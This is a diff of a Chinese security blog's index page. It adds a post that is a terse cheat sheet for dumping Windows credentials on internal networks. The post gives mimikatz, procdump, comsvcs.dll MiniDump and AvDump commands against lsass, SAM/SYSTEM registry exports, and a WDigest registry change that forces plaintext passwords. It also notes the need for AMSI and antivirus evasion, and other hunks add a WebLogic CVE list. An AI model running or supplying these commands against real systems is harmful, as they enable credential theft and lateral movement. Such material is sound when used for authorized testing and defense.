@@ -153,6 +153,99 @@
     
     
     <article
+  id="post-内网抓hash"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/"
+    >内网抓hash/密码</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/" class="article-date">
+  <time datetime="2022-03-25T06:36:39.000Z" itemprop="datePublished">2022-03-25</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91/">内网</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h1><p>需要管理员权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325161740275.png" alt="image-20220325161740275"></p>
+<p>可分为两步：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug             提升权限</span><br><span class="line">sekurlsa::logonpasswords     抓密码</span><br></pre></td></tr></table></figure>
+
+<h1 id="各种dump-mimikatz"><a href="#各种dump-mimikatz" class="headerlink" title="各种dump+mimikatz"></a>各种dump+mimikatz</h1><h3 id="procdump"><a href="#procdump" class="headerlink" title="procdump"></a>procdump</h3><p>(官方软件)</p>
+<p>有杀软的情况procdump不会被杀，但产生的lsass.dmp会可能被清除 （wdf下面会）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp   #然后将lsass.dmp下载到本地</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">procdump64.exe -accepteula -ma [lsass.exe的PID] lsass.dmp</span><br><span class="line">(mimikatz.exe &quot;sekurlsa::minidump dump path &quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325150155475.png" alt="image-20220325150155475"></p>
+<h3 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h3><p>(Windows自带)  powershell 下运行comsvcs.dll 的MiniDump 来dump</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
+
+<p>但要绕过AMSI</p>
+<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325172436533.png" alt="image-20220325172436533"></p>
+<h3 id="AvDump"><a href="#AvDump" class="headerlink" title="AvDump"></a>AvDump</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AvDump.exe --pid &lt;lsass pid&gt; --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\Users\admin\Desktop\lsass.dmp --min_interval 0</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="导出本地SAM-mimikatz"><a href="#导出本地SAM-mimikatz" class="headerlink" title="导出本地SAM+mimikatz"></a>导出本地SAM+mimikatz</h1><p>导出本地sam数据库数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM </span><br></pre></td></tr></table></figure>
+
+<p>mimikatz读取即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325171109114.png" alt="image-20220325171109114"></p>
+<h1 id="rdp明文凭据"><a href="#rdp明文凭据" class="headerlink" title="rdp明文凭据"></a>rdp明文凭据</h1><p>参考:<a target="_blank" rel="noopener" href="https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/">https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/</a></p>
+<p>(<a target="_blank" rel="noopener" href="https://loong716.top/posts/lsass/#2-%E7%AD%BE%E5%90%8D%E7%99%BD%E5%90%8D%E5%8D%95%E6%96%87%E4%BB%B6dum">https://loong716.top/posts/lsass/#2-签名白名单文件dum</a></p>
+<h1 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h1><ol>
+<li>winserver2012以后只能抓到用户hash，抓不到明文</li>
+</ol>
+<p>但可以通过修改注册表，下次目标重启即可抓到明文</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>mimikatz要免杀</li>
+</ol>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%8A%93hash-%E5%AF%86%E7%A0%81/" rel="tag">内网抓hash/密码</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+   
+</article>
+
+    
+    <article
   id="post-Go"
   class="article article-type-post"
   itemscope
@@ -185,8 +278,8 @@
        
   <p>Go 语言被设计成一门应用于搭载 Web 服务器，存储集群或类似用途的巨型中央服务器的系统编程语言。</p>
 <h3 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h3><p>学习go写脚本和 免杀（其他大佬的有些免杀也是用go写的，效果不错，也算是为了能看懂代码吧）</p>
-<p>感觉go结构和java  很像，但go有指针。</p>
-<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p><strong>go build</strong>生成二进制文件exe</p>
+<p>go 没有类，有结构体，有指针，（主要是利用函数）。</p>
+<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p><strong>go build</strong>生成二进制文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build xxx.go</span><br></pre></td></tr></table></figure>
 
 <p>结构</p>
@@ -246,7 +339,13 @@
       
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1> 
+  <h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><p>默认端口：<code>7001</code></p>
+<p>部分历史漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 弱口令&#x2F;任意文件读取+后台war包&#x2F;任意文件上传getshell</span><br><span class="line">2. CVE-2017-20271</span><br><span class="line">3. CVE-2018-2628</span><br><span class="line">4. CVE-2019-2725</span><br><span class="line">5. CVE-2020-2555</span><br><span class="line">6. CVE-2021-2394</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>WebLogic是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BDOracle%E5%85%AC%E5%8F%B8/9952086">美国Oracle公司</a>出品的一个application server，确切的说是一个基于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/JAVAEE/3066623">JAVAEE</a>架构的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6/452240">中间件</a>，WebLogic是用于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BC%80%E5%8F%91/9400971">开发</a>、集成、部署和管理大型分布式Web应用、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/2196523">网络应用</a>和<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/10563731">数据库应用</a>的Java<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8">应用服务器</a>。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
+<p>WebLogic Server具有开发和部署关键任务电子商务Web应用系统 所需的多种特色和优势。</p>
+<p>weblogic是java EE的应用服务器（application server），包括ejb ,jsp,servlet,jms等等，全能型的。是商业软件里排名第一的容器（JSP、servlet、EJB等），并提供其他如JAVA编辑等工具，是一个综合的开发及运行环境。(收费)</p> 
       <a class="article-more-link" href="/2022/03/20/middleware-java/"
         >阅读更多...</a
       >
@@ -744,64 +843,6 @@
     <footer class="article-footer">
        
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%B92021%E5%B9%B4%E6%80%BB%E7%BB%93/" rel="tag">对2021年总结</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-   
-</article>
-
-    
-    <article
-  id="post-简单的靶场渗透"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2022/01/03/%E7%AE%80%E5%8D%95%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"
-    >简单的靶场渗透</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2022/01/03/%E7%AE%80%E5%8D%95%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" class="article-date">
-  <time datetime="2022-01-02T18:17:22.000Z" itemprop="datePublished">2022-01-03</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">提示：一共12个flag，有内网。</span><br><span class="line">标准：5个合格</span><br><span class="line">靶场地址：http:&#x2F;&#x2F;1.14.65.168:8077&#x2F;m&#x2F;index.php</span><br><span class="line">刚过完年，来玩一玩</span><br></pre></td></tr></table></figure>
-
-<p>[TOC]</p> 
-      <a class="article-more-link" href="/2022/01/03/%E7%AE%80%E5%8D%95%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"
-        >阅读更多...</a
-      >
-       
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">漏洞利用</a></li></ul>
 
     </footer>
   </div>
